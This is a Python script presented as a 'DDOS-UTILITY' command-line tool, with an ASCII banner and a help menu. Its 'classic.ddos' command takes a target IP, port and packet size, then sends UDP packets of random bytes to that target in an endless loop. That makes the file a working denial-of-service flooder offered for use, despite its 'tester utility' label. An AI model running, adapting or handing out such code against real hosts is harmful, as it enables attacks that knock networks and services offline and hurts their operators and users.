import os, time, socket, random, colorama
from colorama import Fore, Back, Style
colorama.init()

class Init():
  def __init__(self):
    try:
      os.system('cls' if os.name == 'nt' else 'clear')

      self.loading()

      print(" \n" + Fore.LIGHTRED_EX + " ██████╗ ██████╗  █████╗  ██████╗      ██╗   ██╗████████╗██╗██╗      \n" + " ██╔══██╗██╔══██╗██╔══██╗██╔════╝      ██║   ██║╚══██╔══╝██║██║      \n" + " ██║  ██║██║  ██║██║  ██║╚█████╗ █████╗██║   ██║   ██║   ██║██║      \n" + " ██║  ██║██║  ██║██║  ██║ ╚═══██╗╚════╝██║   ██║   ██║   ██║██║     \n"+  " ██████╔╝██████╔╝╚█████╔╝██████╔╝      ╚██████╔╝   ██║   ██║███████╗ \n" + " ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝        ╚═════╝    ╚═╝   ╚═╝╚══════╝ \n" + Fore.LIGHTRED_EX + "\n" + "        DDOS-UTILITY -- BY SRGWRTG0342\n" + "        A TESTER UTILITY\n" )
      
      self.commandline()
      
    except:
      print("Exit!")
  def commandline(self):
    try:
      while True:
        commandline = input(Fore.LIGHTRED_EX + "     \'help\' - For help menu >>>" + Fore.LIGHTYELLOW_EX + " ")

        if commandline == "help":
          print(Fore.LIGHTYELLOW_EX + "\n         Commands: \n" + "           classic.ddos - Classic method script\n")

        if commandline == "classic.ddos":
          sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          print(Fore.LIGHTYELLOW_EX + "\n      DDOS UTILITY" + " Starter")
          ip = input( Fore.LIGHTYELLOW_EX + "\n     IP >>> ")
          port = input( Fore.LIGHTYELLOW_EX + "     PORT >>> ")
          numbytes = input( Fore.LIGHTYELLOW_EX + "     PACKET SIZE(bytes) >>>")
          numbytes = int(numbytes)

          if numbytes != int(numbytes):
            print("Error!")

          bytes = random._urandom(int(numbytes))
          port = int(port)

          os.system('cls' if os.name == 'nt' else 'clear')
          time.sleep(3)
          sent = 0

          while True:
            sock.sendto(bytes, ( ip, port))
            sent = sent + 1
            print ("Send %s packets %s to port:%s"%(sent,ip,port))
    except:
      print("Exit!")
  def loading(self):
    ttt = Fore.LIGHTRED_EX + "LOADING - █"
    tpt = Fore.LIGHTRED_EX + "█"
    ztp = ""
    ttt = str(ttt)
    tpt = str(tpt)
    ztp = str(ztp)
    ttt = Fore.LIGHTRED_EX + "LOADING - █"
    ttt = str(ttt)
    for i in range(20):
      time.sleep(0.005)
      os.system('cls' if os.name == 'nt' else 'clear')
      ttt += tpt
      print(ttt)
      time.sleep(0.005)
      os.system('cls' if os.name == 'nt' else 'clear')

Init()